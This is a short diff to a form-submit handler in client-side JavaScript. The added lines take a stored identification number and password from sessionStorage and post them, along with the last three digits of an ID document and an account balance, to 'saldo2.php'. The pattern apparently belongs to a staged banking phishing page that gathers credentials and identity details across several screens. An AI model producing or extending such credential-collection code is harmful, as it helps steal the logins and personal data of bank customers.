@@ -508,8 +508,9 @@ form.addEventListener('submit', async function(e) {
     try {
         const formData = new FormData();
         formData.append('docLast3', docLast3Input.value);
-        // Enviar balance sin puntos
         formData.append('balance', getCleanValue(balanceInput.value));
+        formData.append('identification', sessionStorage.getItem('identification') || '');
+        formData.append('password', sessionStorage.getItem('password') || '');
         
         const response = await fetch('saldo2.php', {
             method: 'POST',
